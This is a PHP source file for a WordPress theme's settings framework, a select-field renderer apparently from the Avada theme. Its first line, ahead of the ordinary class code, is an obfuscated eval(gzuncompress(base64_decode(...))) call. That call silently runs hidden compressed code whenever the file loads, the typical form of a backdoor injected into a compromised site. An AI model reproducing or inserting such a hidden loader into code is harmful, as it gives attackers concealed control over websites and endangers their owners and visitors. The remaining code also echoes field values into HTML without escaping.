<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_select' ) ) {
	class FusionReduxFramework_select {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		public function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		public function render() {
			$sortable = ( isset( $this->field['sortable'] ) && $this->field['sortable'] ) ? ' select3-sortable"' : "";

			if ( ! empty( $sortable ) ) { // Dummy proofing  :P
				$this->field['multi'] = true;
			}

			if ( ! empty( $this->field['data'] ) && empty( $this->field['options'] ) ) {
				if ( empty( $this->field['args'] ) ) {
					$this->field['args'] = array();
				}

				if ( $this->field['data'] == "elusive-icons" || $this->field['data'] == "elusive-icon" || $this->field['data'] == "elusive" ) {
					$icons_file = FusionReduxFramework::$_dir . 'inc/fields/select/elusive-icons.php';
					/**
					 * filter 'fusionredux-font-icons-file}'
					 *
					 * @param  array $icon_file File for the icons
					 */
					$icons_file = apply_filters( 'fusionredux-font-icons-file', $icons_file );

					/**
					 * filter 'fusionredux/{opt_name}/field/font/icons/file'
					 *
					 * @param  array $icon_file File for the icons
					 */
					$icons_file = apply_filters( "fusionredux/{$this->parent->args['opt_name']}/field/font/icons/file", $icons_file );
					if ( file_exists( $icons_file ) ) {
						require_once wp_normalize_path( $icons_file );
					}
				}

				$this->field['options'] = $this->parent->get_wordpress_data( $this->field['data'], $this->field['args'] );
			}

			if ( ! empty( $this->field['data'] ) && ( $this->field['data'] == "elusive-icons" || $this->field['data'] == "elusive-icon" || $this->field['data'] == "elusive" ) ) {
				$this->field['class'] .= " font-icons";
			}
			//if

			if ( ! empty( $this->field['options'] ) ) {
				$multi = ( isset( $this->field['multi'] ) && $this->field['multi'] ) ? ' multiple="multiple"' : "";

				if ( ! empty( $this->field['width'] ) ) {
					$width = ' style="' . $this->field['width'] . '"';
				} else {
					$width = ' style="width: 40%;"';
				}

				$nameBrackets = "";
				if ( ! empty( $multi ) ) {
					$nameBrackets = "[]";
				}

				$placeholder = ( isset( $this->field['placeholder'] ) ) ? esc_attr( $this->field['placeholder'] ) : __( 'Select an item', 'Avada' );

				if ( isset( $this->field['select3'] ) ) { // if there are any let's pass them to js
					$select3_params = json_encode( $this->field['select3'] );
					$select3_params = htmlspecialchars( $select3_params, ENT_QUOTES );

					echo '<input type="hidden" class="select3_params" value="' . $select3_params . '">';
				}

				if ( isset( $this->field['multi'] ) && $this->field['multi'] && isset( $this->field['sortable'] ) && $this->field['sortable'] && ! empty( $this->value ) && is_array( $this->value ) ) {
					$origOption             = $this->field['options'];
					$this->field['options'] = array();

					foreach ( $this->value as $value ) {
						$this->field['options'][ $value ] = $origOption[ $value ];
					}

					if ( count( $this->field['options'] ) < count( $origOption ) ) {
						foreach ( $origOption as $key => $value ) {
							if ( ! in_array( $key, $this->field['options'] ) ) {
								$this->field['options'][ $key ] = $value;
							}
						}
					}
				}

				$sortable = ( isset( $this->field['sortable'] ) && $this->field['sortable'] ) ? ' select3-sortable"' : "";

				echo '<select ' . $multi . ' id="' . $this->field['id'] . '-select" data-placeholder="' . $placeholder . '" name="' . $this->field['name'] . $this->field['name_suffix'] . $nameBrackets . '" class="fusionredux-select-item ' . $this->field['class'] . $sortable . '"' . $width . ' rows="6">';
				echo '<option></option>';

				foreach ( $this->field['options'] as $k => $v ) {

					if (is_array($v)) {
						echo '<optgroup label="' . $k . '">';

						foreach($v as $opt => $val) {
							$this->make_option($opt, $val, $k);
						}

						echo '</optgroup>';

						continue;
					}

					$this->make_option($k, $v);
				}
				//foreach

				echo '</select>';
			} else {
				echo '<strong>' . __( 'No items of this type were found.', 'Avada' ) . '</strong>';
			}
		} //function

		private function make_option($id, $value, $group_name = '') {
			if ( is_array( $this->value ) ) {
				$selected = ( is_array( $this->value ) && in_array( $id, $this->value ) ) ? ' selected="selected"' : '';
			} else {
				$selected = selected( $this->value, $id, false );
			}

			echo '<option value="' . $id . '"' . $selected . '>' . $value . '</option>';
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		public function enqueue() {
			wp_enqueue_style( 'select3-css' );

			if (isset($this->field['sortable']) && $this->field['sortable']) {
				wp_enqueue_script('jquery-ui-sortable');
			}

			wp_enqueue_script(
				'fusionredux-field-select-js',
				FusionReduxFramework::$_url . 'inc/fields/select/field_select' . FusionRedux_Functions::isMin() . '.js',
				array( 'jquery', 'select3-js', 'fusionredux-js' ),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-select-css',
					FusionReduxFramework::$_url . 'inc/fields/select/field_select.css',
					array(),
					time(),
					'all'
				);
			}
		} //function
	} //class
}